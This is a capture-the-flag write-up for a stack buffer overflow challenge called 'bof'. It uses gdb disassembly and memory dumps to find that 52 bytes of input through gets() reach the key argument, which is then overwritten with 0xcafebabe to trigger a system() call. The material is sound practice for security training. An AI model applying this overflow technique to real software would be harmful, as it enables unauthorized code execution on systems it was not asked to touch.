# bof

1. Run bof under gdb  
```
$ gdb ./bof

```

2. Disassemble main function:
```
(gdb) disas main

Dump of assembler code for function main:
   0x0000068a <+0>:     push   %ebp
   0x0000068b <+1>:     mov    %esp,%ebp
   0x0000068d <+3>:     and    $0xfffffff0,%esp
   0x00000690 <+6>:     sub    $0x10,%esp
   0x00000693 <+9>:     movl   $0xdeadbeef,(%esp)
   0x0000069a <+16>:    call   0x62c <func>
   0x0000069f <+21>:    mov    $0x0,%eax
   0x000006a4 <+26>:    leave
   0x000006a5 <+27>:    ret
End of assembler dump.
```

3. The goal is to search for memory address of the stack pointer (ESP) which contains `key` variable and override it with `0xcafebabe`.
Set a breakpoint at `main + <16>` to see an address stored in `esp`.   
```
(gdb) break *main+16
(gdb) run
(gdb) print $esp
(gdb) x/x $esp
```

4. Now we have to find an adress of `overflowme` buffer from `func` function to know how many bytes need to be read in from the input to overflow `esp` content.

```
(gdb) disas func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   %ebp
   0x5655562d <+1>:     mov    %esp,%ebp
   0x5655562f <+3>:     sub    $0x48,%esp
   0x56555632 <+6>:     mov    %gs:0x14,%eax
   0x56555638 <+12>:    mov    %eax,-0xc(%ebp)
   0x5655563b <+15>:    xor    %eax,%eax
   0x5655563d <+17>:    movl   $0x5655578c,(%esp)
   0x56555644 <+24>:    call   0xf7e38b40 <puts>
   0x56555649 <+29>:    lea    -0x2c(%ebp),%eax
   0x5655564c <+32>:    mov    %eax,(%esp)
   0x5655564f <+35>:    call   0xf7e382b0 <gets>
   0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    movl   $0x5655579b,(%esp)
   0x56555664 <+56>:    call   0xf7e0e200 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    movl   $0x565557a3,(%esp)
   0x56555672 <+70>:    call   0xf7e38b40 <puts>
   0x56555677 <+75>:    mov    -0xc(%ebp),%eax
   0x5655567a <+78>:    xor    %gs:0x14,%eax
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7edab60 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
End of assembler dump.
```

5. We can see from the line `0x56555649 <+29>:    lea    -0x2c(%ebp),%eax` that moves start address of `overflowme` buffer `$ebp - 0x2c` into `$eax`
Set a breakpoint at compare instruction and run (assign some F (0x46) into gets):
```
(gdb) break *func+40
(gdb) c
Continuing.
overflow me : 
FFFFFFFFFFFFFFFFFFFFF
```
See the $ebp and the beginning of overflowme buffer:
```
(gdb) x/x $ebp
(gdb) x/20xhw $ebp-0x2c
0xffffceac:     0x46464646      0x46464646      0x46464646      0x46464646
0xffffcebc:     0x46464646      0xf7fa0046      0x00000000      0x56556ff4
0xffffcecc:     0xa7717500      0x00000000      0xf7e015db      0xffffcef8
0xffffcedc:     0x5655569f      0xdeadbeef      0x00000000      0x565556b9
0xffffceec:     0x00000000      0xf7fa9000      0xf7fa9000      0x00000000
```
`0x46464646` are our four `F` chars provided by gets.


6. Now we have to override `0xdeadbeef` from `key` input fuction parameter with `0xcafebabe`  which is stored at `$ebp+0x8`.
Number of bytes to be put into gets function: `0x8 + 0x2c = 8 + 44 = 52` where next bytes should be `0xcafebabe`.


You'll get the flag:  
```
FLAG: {}
```